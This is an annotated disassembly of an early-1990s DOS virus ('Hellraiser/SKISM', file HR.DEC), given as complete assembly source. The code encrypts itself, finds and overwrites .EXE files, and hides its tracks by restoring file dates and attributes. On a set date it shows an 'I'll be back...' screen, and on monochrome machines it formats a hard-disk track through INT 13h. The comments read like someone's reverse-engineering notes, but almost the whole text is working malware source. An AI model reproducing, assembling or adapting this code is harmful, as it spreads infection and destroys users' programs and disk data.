;NAME:          HR.DEC
;FILE SIZE:     0062Ch - 1580d
;START (CS:IP): 00100h
;CODE END:      0072Ch
;CODE ORIGIN:   00100h
;DATE:          Sun Aug 02 17:20:02 1992

CODE    SEGMENT BYTE PUBLIC 'CODE'
ASSUME  CS:CODE,DS:CODE,ES:NOTHING,SS:NOTHING

P00100  PROC
        ORG     0100h

START:  JMP     Short BEGIN
;---------------------------------------------------
        NOP
ENCRKEY:DB      0Ch,32h         ; 32h may not be needed... ;OR AH,32
BEGIN:  CALL    CRYPT           ; Decrypt the virus
        JMP     H00520
;---------------------------------------------------
CRYPT:  PUSH    CX
        MOV     SI,OFFSET MESSAGE
        MOV     DI,SI
        MOV     CX,0766h
        CLD
LOOP_1: LODSW
        XOR     AX,DS:ENCRKEY   ;DS may not be needed
        STOSW
        DEC     CX
        JNZ     LOOP_1
        POP     CX
        RET
;---------------------------------------------------
INFECT: MOV     DX,0100h        ;Offset to begin at
        MOV     BX,DS:[HANDLE]  ;BX=File handle
        PUSH    BX              ;I don't know why, BX doesn't change.
        MOV     CX,062Ch        ;CX=number of bytes to write
        CALL    CRYPT           ;Encrypt before saving
        POP     BX              ;I don't know why, BX doesn't change.
        MOV     AX,4000h        ;AH = 40h, write to file.
        INT     21h             ;Infect the file.
        PUSH    BX              ;Again, BX never changes.
        CALL    CRYPT           ; . . . . . . . . .
        POP     BX
        RET                     ;RET_Near
;---------------------------------------------------
; This is the big, red, block letters that shows when it goes off.
MESSAGE:
DB 0Fh,10h,18h,19h,1Fh,"I'll be back..."
DB 18h,18h,14h,20h,20h,00Ch,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h
DB 14h,19h,05h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,19h,04h,14h,20h
DB 20h,0DEh,10h,19h,05h,14h,19h,05h,0DEh,10h,20h,20h,14h,19h,06h
DB 0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,14h,19h,05h,0DEh,10h,20h
DB 14h,19h,05h,0DEh,10h,20h,14h,19h,05h,0DEh,18h,20h,20h,0DEh,10h
DB 20h,14h,20h,20h,0DEh,10h,20h,14h,19h,05h,0DEh,10h,20h,14h,20h,20h
DB 0DEh,10h,19h,04h,14h,20h,20h,0DEh,10h,19h,05h,14h,19h,06h,16h,0DEh
DB 10h,20h,14h,19h,06h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,14h,19h
DB 05h,0DEh,10h,20h,14h,19h,05h,0DEh,10h,20h,14h,19h,06h,0DEh,18h,20h
DB 20h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,19h
DB 04h,14h,20h,20h,0DEh,10h,19h,04h,14h,20h,20h,0DEh,10h,19h,05h,14h,20h
DB 20h,0DEh,10h,20h,20h,14h,20h,20h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h
DB 20h,14h,20h,20h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,14h,20h
DB 20h,16h,0DEh,10h,19h,04h,14h,20h,20h,0DEh,10h,19h,04h,14h,20h,20h
DB 0DEh,10h,20h,20h,14h,20h,20h,16h,0DEh,18h,14h,19h,05h,0DEh,10h,20h
DB 14h,19h,05h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,19h,04h,14h,20h,20h,0DEh
DB 10h,19h,05h,14h,20h,20h,0DEh,10h,20h,20h,14h,20h,20h,0DEh,10h,20h,14h,20h
DB 20h,0DEh,10h,20h,20h,14h,20h,20h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,14h
DB 19h,05h,16h,0DEh,10h,20h,14h,19h,04h,0DEh,10h,20h,20h,14h,20h,20h
DB 0DEh,10h,20h,20h,14h,20h,20h,0DEh,18h,20h,20h,0DEh,10h,20h,14h,20h,20h
DB 0DEh,10h,20h,14h,20h,20h,0DEh,10h,19h,04h,14h,20h,20h,0DEh,10h,19h
DB 04h,14h,20h,20h,0DEh,10h,19h,05h,14h,19h,04h,0DEh,10h,19h,02h,14h
DB 19h,06h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,19h,04h,14h,20h,20h,16h
DB 0DEh,10h,20h,14h,20h,20h,0DEh,10h,19h,04h,14h,19h,04h,16h,0DEh,18h,14h
DB 20h,20h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,14h,19h,05h,0DEh,10h
DB 20h,14h,19h,05h,0DEh,10h,20h,14h,19h,06h,0DEh,10h,20h,14h,20h,20h,0DEh
DB 10h,20h,14h,20h,20h,0DEh,10h,20h,20h,14h,20h,20h,0DEh,10h,20h,20h,14h,20h,20h
DB 0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,14h,19h,05h,0DEh,10h,20h,14h,19h,05h,0DEh
DB 10h,20h,14h,20h,20h,0DEh,10h,20h,14h,20h,20h,0DEh,18h,20h,20h,0DEh
DB 10h,20h,14h,20h,20h,0DEh,10h,20h,14h,19h,05h,0DEh,10h,20h,14h,19h,05h
DB 0DEh,10h,20h,14h,19h,06h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,20h,14h
DB 20h,20h,0DEh,10h,20h,14h,20h,20h,0DEh,10h,20h,20h,14h,20h,20h,0DEh,10h,20h
DB 14h,20h,20h,0DEh,10h,20h,14h,19h,05h,0DEh,10h,20h,14h,19h,05h,0DEh,10h,20h
DB 14h,20h,20h,0DEh,10h,20h,20h,14h,20h,20h,0DEh,18h,20h,10h,19h,03h,14h
DB 20h,10h,19h,02h,14h,20h,20h,10h,19h,05h,14h,20h,20h,10h,19h,06h,14h,20h
DB 20h,10h,20h,20h,14h,20h,10h,19h,02h,14h,20h,10h,19h,03h,14h,20h,10h,19h
DB 02h,14h,20h,10h,19h,02h,14h,20h,20h,10h,20h,20h,14h,20h,10h,19h
DB 03h,14h,20h,20h,10h,19h,06h,14h,20h,20h,10h,19h,04h,14h,20h
DB 10h,19h,02h,14h,20h,20h,18h,20h,10h,19h,03h,14h,20h,10h,19h,02h
DB 14h,20h,10h,19h,06h,14h,20h,10h,19h,07h,14h,20h,10h,19h,02h,14h
DB 20h,10h,19h,02h,14h,20h,10h,19h,03h,14h,20h,10h,19h,06h,14h,20h
DB 10h,19h,02h,14h,20h,10h,19h,03h,14h,20h,10h,19h,07h,14h,20h,10h,19h
DB 05h,14h,20h,10h,19h,03h,14h,20h,18h,20h,10h,19h,00Fh,14h,20h,10h,19h
DB 07h,14h,20h,10h,19h,02h,14h,20h,10h,19h,07h,14h,20h,10h,19h,06h
DB 14h,20h,10h,19h,07h,14h,20h,10h,19h,07h,14h,20h,10h,19h,00Ah,14h
DB 20h,18h,20h,10h,19h,00Fh,14h,20h,10h,19h,07h,14h,20h,10h,19h,13h,14h
DB 20h,10h,19h,10h,14h,20h,18h,10h,19h,40h,14h,20h,18h,18h,2Ah
;---------------------------------------------------
        DB      00                                  ;00454
        DB      "*.EXE"                             ;00455
        DB      00h,"\",00h,03h                     ;0045A
        DB      8 DUP("?")                          ;0045E 3F
	DB	"   "				    ;00466 202020
;---------------------------------------------------
;This area is perplexing. Doesn't seem to be ever called, nor read from.
        ADC     AX,[BP+DI]                          ;00469 1303          __
	ADD	[BX+SI],AL			    ;0046B 0000 	 __
	ADD	[BP+SI],CH			    ;0046D 002A 	 _*
	SHR	BP,1				    ;0046F D1ED 	 __
	DEC	DX				    ;00471 4A		 J
	ADC	DL,DS:[0E278h]			    ;00472 121678E2	 __x_
	PUSH	SS				    ;00476 16		 _
	ADD	[BX+SI],AL			    ;00477 0000 	 __
	ADD	[BX+SI],AL			    ;00479 0000 	 __
;---------------------------------------------------
	DB	"ARMOR" 			    ;0047B 41524D4F52
	DB	00h				    ;00480
	DB	"  "				    ;00481 2020
	DB	00h				    ;00483
	DB	00h				    ;00484
	DB	00h				    ;00485
	DB	00h				    ;00486
	DB	00h				    ;00487
	DB	03h				    ;00488
	DB	8 DUP("?")			    ;00489 3F
	DB	"EXE"				    ;00491 455845
	DB	07h				    ;00494
	DB	04h				    ;00495
	DB	00h				    ;00496
	DB	"3"				    ;00497 33
	DB	1Fh				    ;00498
	DB	"*"				    ;00499 2A
	DB	0D1h				    ;0049A
	DB	0EDh				    ;0049B
        DB      "J "                                ;0049C 4A20
	DB	02h				    ;0049E
	DB	"x"				    ;0049F 78
	DB	0F0h				    ;004A0
	DB	16h				    ;004A1
	DB	02h				    ;004A2
	DB	00h				    ;004A3
	DB	00h				    ;004A4
	DB	00h				    ;004A5
	DB	"SAMPLE3.EXE"			    ;004A6 53414D504C4533
	DB	00h				    ;004B1
	DB	00h				    ;004B2
	DB	9Eh				    ;004B3
	DB	"-]"				    ;004B4 2D5D
	DB	04h				    ;004B6
	DB	88h				    ;004B7
	DB	04h				    ;004B8
	DB	9Eh				    ;004B9
	DB	"-"				    ;004BA 2D
	DB	00h				    ;004BB
	DB	"ARMOR" 			    ;004BC 41524D4F52
	DB	00h				    ;004C1
	DB	58 DUP(00h)			    ;004C2
HANDLE: DB      05h                                 ;004FC
	DB	00h				    ;004FD
	DB	02h				    ;004FE
	DB	"x"				    ;004FF 78
	DB	0F0h				    ;00500
	DB	16h				    ;00501
	DB	" "				    ;00502 20
	DB	00h				    ;00503
	DB	0CDh				    ;00504
	DB	" "				    ;00505 20
	DB	00h				    ;00506
	DB	00h				    ;00507
	DB	"Written by Dennis Yelle"	    ;00508 5772697474656E
	DB	00h				    ;0051F
;---------------------------------------------------
; Create new encryption key
H00520: MOV     AX,3000h                            ;00520 B80030        __0
	INT	21h		;2-DOS_Ver	    ;00523 CD21 	 _!
	CMP	AL,02h				    ;00525 3C02 	 <_
	JB	H0056B				    ;00527 7242 	 rB
	MOV	AH,2Ch				    ;00529 B42C 	 _,
	INT	21h		;1-Get_Time	    ;0052B CD21 	 _!
	MOV	DS:[0103h],DX			    ;0052D 89160301	 ____
; Check to see if it's the last Friday in month, if so, go off.
H00531: MOV     AH,2Ah                              ;00531 B42A          _*
        INT     21h             ;1-Get_Date         ;00533 CD21          _!
        CMP     DL,19h                              ;00535 80FA19        ___
	JL	H0053E				    ;00538 7C04 	 |_
	CMP	AL,05h				    ;0053A 3C05 	 <_
	JZ	H00541				    ;0053C 7403 	 t_
H0053E: JMP	H005F2				    ;0053E E9B100	 ___
;---------------------------------------------------
; GO OFF!
H00541: MOV     AH,0Fh                                   ;00541 B40F
        INT     10h             ;Get current vid mode    ;00543 CD10
        CMP     AL,07h                                   ;00545 3C07
        JZ      H00568          ;If mono, format         ;00547 741F
        MOV     AX,0003h        ;80x25 16 color          ;00549 B80300
        INT     10h             ;Set video mode          ;0054C CD10
        MOV     AH,01h                                   ;0054E B401
        MOV     CX,0808h        ;No cursor               ;00550 B90808
        INT     10h             ;Set cursor size         ;00553 CD10
        MOV     SI,013Ah                                 ;00555 BE3A01
        MOV     AX,0B800h       ;Video segment           ;00558 B800B8
        MOV     ES,AX           ;ES_Chg                  ;0055B 8EC0
        MOV     DI,0000h        ;                        ;0055D BF0000
        MOV     CX,0319h                                 ;00560 B91903
        CALL    H0057E          ; . . . . . . . . .      ;00563 E81800
        JMP     Short H00531                             ;00566 EBC9
;---------------------------------------------------
H00568: JMP	Short H005DC			    ;00568 EB72 	 _r
;---------------------------------------------------
	NOP					    ;0056A 90		 _
H0056B: JMP	H0061E				    ;0056B E9B000	 ___
;---------------------------------------------------
	DB	"  -=PHALCON=-  "		    ;0056E 20202D3D504841
	DB	00h				    ;0057D

;---------------------------------------------------
; Display message... TheDraw algorythm for unpacking image.
H0057E: JCXZ    H005DB          ;Jumps to a ret     ;0057E E35B          _[
        MOV     DX,DI                               ;00580 8BD7          __
	XOR	AX,AX				    ;00582 33C0 	 3_
	CLD					    ;00584 FC		 _
H00585: LODSB                   ;Take a byte        ;00585 AC            _
        CMP     AL,20h          ;If it's <space     ;00586 3C20          <
        JB      H0058F          ;Jump               ;00588 7205          r_
        STOSW                   ;Move to screen     ;0058A AB            _
H0058B: LOOP    H00585                              ;0058B E2F8          __
	JMP	Short H005DB			    ;0058D EB4C 	 _L
;---------------------------------------------------
H0058F: CMP     AL,10h          ;If it's not<10h    ;0058F 3C10          <_
        JNB     H0059A          ;Jump               ;00591 7307          s_
	AND	AH,0F0h 			    ;00593 80E4F0	 ___
	OR	AH,AL				    ;00596 0AE0 	 __
	JMP	Short H0058B			    ;00598 EBF1 	 __
;---------------------------------------------------
H0059A: CMP     AL,18h                              ;0059A 3C18          <_
	JZ	H005B1				    ;0059C 7413 	 t_
	JNB	H005B9				    ;0059E 7319 	 s_
	SUB	AL,10h				    ;005A0 2C10 	 ,_
	ADD	AL,AL				    ;005A2 02C0 	 __
	ADD	AL,AL				    ;005A4 02C0 	 __
	ADD	AL,AL				    ;005A6 02C0 	 __
	ADD	AL,AL				    ;005A8 02C0 	 __
	AND	AH,8Fh				    ;005AA 80E48F	 ___
	OR	AH,AL				    ;005AD 0AE0 	 __
        JMP     Short H0058B                        ;005AF EBDA          __
;---------------------------------------------------
H005B1: ADD	DX,00A0h			    ;005B1 81C2A000	 ____
	MOV	DI,DX				    ;005B5 8BFA 	 __
	JMP	Short H0058B			    ;005B7 EBD2 	 __
;---------------------------------------------------
H005B9: CMP	AL,1Bh				    ;005B9 3C1B 	 <_
	JB	H005C4				    ;005BB 7207 	 r_
	JNZ	H0058B				    ;005BD 75CC 	 u_
	XOR	AH,80h				    ;005BF 80F480	 ___
	JMP	Short H0058B			    ;005C2 EBC7 	 __
;---------------------------------------------------
H005C4: CMP	AL,19h				    ;005C4 3C19 	 <_
	MOV	BX,CX				    ;005C6 8BD9 	 __
	LODSB					    ;005C8 AC		 _
	MOV	CL,AL				    ;005C9 8AC8 	 __
	MOV	AL,20h				    ;005CB B020 	 _ 
	JZ	H005D1				    ;005CD 7402 	 t_
	LODSB					    ;005CF AC		 _
	DEC	BX				    ;005D0 4B		 K
H005D1: XOR	CH,CH				    ;005D1 32ED 	 2_
	INC	CX				    ;005D3 41		 A
	REPZ	STOSW				    ;005D4 F3AB 	 __
	MOV	CX,BX				    ;005D6 8BCB 	 __
	DEC	CX				    ;005D8 49		 I
	LOOPNZ	H00585				    ;005D9 E0AA 	 __
H005DB: RET			;RET_Near	    ;005DB C3		 _
;End of display message procedure

;---------------------------------------------------
H005DC: MOV	AH,15h				    ;005DC B415 	 __
	MOV	DL,80h				    ;005DE B280 	 __
	INT	13h		;BAT-Dsk_Type	    ;005E0 CD13 	 __
	CMP	AH,03h				    ;005E2 80FC03	 ___
	JNZ	H005F2				    ;005E5 750B 	 u_
	MOV	AX,0504h			    ;005E7 B80405	 ___
	MOV	CX,DS:[0103h]			    ;005EA 8B0E0301	 ____
	MOV	DL,80h				    ;005EE B280 	 __
	INT	13h		;B-Fmt_FD_Trk	    ;005F0 CD13 	 __
H005F2: MOV	DX,045Dh			    ;005F2 BA5D04	 _]_
	MOV	AH,1Ah				    ;005F5 B41A 	 __
	INT	21h		;1-Set_DTA	    ;005F7 CD21 	 _!
	MOV	AH,19h				    ;005F9 B419 	 __
	INT	21h		;1-Get_Cur_Dr	    ;005FB CD21 	 _!
	MOV	DL,AL				    ;005FD 8AD0 	 __
	INC	DL				    ;005FF FEC2 	 __
	MOV	AH,47h				    ;00601 B447 	 _G
	MOV	SI,04BCh			    ;00603 BEBC04	 ___
	INT	21h		;2-Cur_Dir	    ;00606 CD21 	 _!
	MOV	DX,045Bh			    ;00608 BA5B04	 _[_
	MOV	AH,3Bh				    ;0060B B43B 	 _;
	INT	21h		;2-Chg_Dir	    ;0060D CD21 	 _!
	MOV	CX,0013h			    ;0060F B91300	 ___
	MOV	DX,0453h			    ;00612 BA5304	 _S_
	MOV	AH,4Eh				    ;00615 B44E 	 _N
	INT	21h		;2-Srch_1st_Fl_Hdl  ;00617 CD21 	 _!
	CMP	AX,0012h			    ;00619 3D1200	 =__
	JNZ	H00621				    ;0061C 7503 	 u_
H0061E: JMP	Short H00671			    ;0061E EB51 	 _Q
;---------------------------------------------------
	NOP					    ;00620 90		 _
H00621: MOV	AH,4Fh				    ;00621 B44F 	 _O
	INT	21h		;2-Srch_Nxt_Fl_Hdl  ;00623 CD21 	 _!
	CMP	AX,0012h			    ;00625 3D1200	 =__
	JZ	H00671				    ;00628 7447 	 tG
	MOV	DX,047Bh			    ;0062A BA7B04	 _{_
	MOV	AH,3Bh				    ;0062D B43B 	 _;
	INT	21h		;2-Chg_Dir	    ;0062F CD21 	 _!
	MOV	AH,2Fh				    ;00631 B42F 	 _/
	INT	21h		;2-Get_DTA	    ;00633 CD21 	 _!
	MOV	DS:[04B3h],ES			    ;00635 8C06B304	 ____
	MOV	DS:[04B5h],BX			    ;00639 891EB504	 ____
	MOV	DX,0488h			    ;0063D BA8804	 ___
	MOV	AH,1Ah				    ;00640 B41A 	 __
	INT	21h		;1-Set_DTA	    ;00642 CD21 	 _!
	MOV	CX,0007h			    ;00644 B90700	 ___
	MOV	DX,0455h			    ;00647 BA5504	 _U_
	MOV	AH,4Eh				    ;0064A B44E 	 _N
	INT	21h		;2-Srch_1st_Fl_Hdl  ;0064C CD21 	 _!
	CMP	AX,0012h			    ;0064E 3D1200	 =__
        JNZ     H00674                              ;00651 7521          u!
H00653: MOV     AH,4Fh                              ;00653 B44F          _O
	INT	21h		;2-Srch_Nxt_Fl_Hdl  ;00655 CD21 	 _!
	CMP	AX,0012h			    ;00657 3D1200	 =__
	JNZ	H00674				    ;0065A 7518 	 u_
	MOV	DX,045Bh			    ;0065C BA5B04	 _[_
	MOV	AH,3Bh				    ;0065F B43B 	 _;
	INT	21h		;2-Chg_Dir	    ;00661 CD21 	 _!
	MOV	AH,1Ah				    ;00663 B41A 	 __
	MOV	DS,DS:[04B3h]	;DS_Chg 	    ;00665 8E1EB304	 ____
	MOV	DX,DS:[04B5h]			    ;00669 8B16B504	 ____
	INT	21h		;1-Set_DTA	    ;0066D CD21 	 _!
	JMP	Short H00621			    ;0066F EBB0 	 __
;---------------------------------------------------
H00671: JMP	Short H006EC			    ;00671 EB79 	 _y
;---------------------------------------------------
	NOP					    ;00673 90		 _
H00674: MOV	AH,2Fh				    ;00674 B42F 	 _/
	INT	21h		;2-Get_DTA	    ;00676 CD21 	 _!
	MOV	DS:[04B9h],ES			    ;00678 8C06B904	 ____
	MOV	DS:[04B7h],BX			    ;0067C 891EB704	 ____
	MOV	DX,04A6h			    ;00680 BAA604	 ___
	MOV	BX,0488h			    ;00683 BB8804	 ___
	MOV	AX,[BX+18h]			    ;00686 8B4718	 _G_
	MOV	DS:[0500h],AX			    ;00689 A30005	 ___
	MOV	AX,[BX+16h]			    ;0068C 8B4716	 _G_
	MOV	DS:[04FEh],AX			    ;0068F A3FE04	 ___
	MOV	AX,[BX+15h]			    ;00692 8B4715	 _G_
	MOV	AX,4300h			    ;00695 B80043	 __C
	INT	21h		;2-Fl_Hdl_Attr	    ;00698 CD21 	 _!
	MOV	DS:[0502h],CX			    ;0069A 890E0205	 ____
	MOV	AX,4301h			    ;0069E B80143	 __C
	XOR	CX,CX				    ;006A1 33C9 	 3_
	INT	21h		;1-TERM_norm:21h-00h;006A3 CD21 	 _!
;---------------------------------------------------
	MOV	AX,3D00h			    ;006A5 B8003D	 __=
	INT	21h		;2-Open_Fl_Hdl	    ;006A8 CD21 	 _!
	JB	H006CF				    ;006AA 7223 	 r#
        MOV     DS:[HANDLE],AX                      ;006AC A3FC04        ___
	MOV	AH,3Fh				    ;006AF B43F 	 _?
        MOV     BX,DS:[HANDLE]                      ;006B1 8B1EFC04      ____
	MOV	CX,0002h			    ;006B5 B90200	 ___
	MOV	DX,0504h			    ;006B8 BA0405	 ___
	INT	21h		;2-Rd_Fl_Hdl	    ;006BB CD21 	 _!
	MOV	AH,3Eh				    ;006BD B43E 	 _>
        MOV     BX,DS:[HANDLE]                      ;006BF 8B1EFC04      ____
	INT	21h		;2-Close_Fl_Hdl     ;006C3 CD21 	 _!
	MOV	BX,DS:[0504h]			    ;006C5 8B1E0405	 ____
	CMP	BX,03EBh			    ;006C9 81FBEB03	 ____
	JNZ	H006DE				    ;006CD 750F 	 u_
H006CF: MOV	AH,1Ah				    ;006CF B41A 	 __
	MOV	DS,DS:[04B9h]	;DS_Chg 	    ;006D1 8E1EB904	 ____
	MOV	DX,DS:[04B7h]			    ;006D5 8B16B704	 ____
	INT	21h		;1-Set_DTA	    ;006D9 CD21 	 _!
	JMP	H00653				    ;006DB E975FF	 _u_
;---------------------------------------------------
H006DE: MOV	DX,04A6h			    ;006DE BAA604	 ___
	MOV	AX,3D02h			    ;006E1 B8023D	 __=
	INT	21h		;2-Open_Fl_Hdl	    ;006E4 CD21 	 _!
        MOV     DS:[HANDLE],AX                      ;006E6 A3FC04        ___
        CALL    INFECT          ; . . . . . . . . . ;006E9 E834FA        _4_
H006EC: MOV	AX,5701h			    ;006EC B80157	 __W
        MOV     BX,DS:[HANDLE]                      ;006EF 8B1EFC04      ____
	MOV	CX,DS:[04FEh]			    ;006F3 8B0EFE04	 ____
	MOV	DX,DS:[0500h]			    ;006F7 8B160005	 ____
	INT	21h		;2-Fl_Hdl_Date_Time ;006FB CD21 	 _!
	MOV	AX,4301h			    ;006FD B80143	 __C
	MOV	CX,DS:[0502h]			    ;00700 8B0E0205	 ____
	MOV	DX,04A6h			    ;00704 BAA604	 ___
	INT	21h		;2-Fl_Hdl_Attr	    ;00707 CD21 	 _!
	MOV	AH,3Bh				    ;00709 B43B 	 _;
	MOV	DX,045Bh			    ;0070B BA5B04	 _[_
	INT	21h		;2-Chg_Dir	    ;0070E CD21 	 _!
	MOV	AH,3Bh				    ;00710 B43B 	 _;
	MOV	DX,04BCh			    ;00712 BABC04	 ___
	INT	21h		;2-Chg_Dir	    ;00715 CD21 	 _!
	MOV	AX,4C00h			    ;00717 B8004C	 __L
	INT	21h		;2-TERM_w_Ret_Cd    ;0071A CD21 	 _!
;---------------------------------------------------
	DB	"Hellraiser/SKISM"		    ;0071C 48656C6C726169
;---------------------------------------------------

P00100  ENDP

CODE    ENDS
        END     H00100
 
;-------------------------------------------------------------------------------

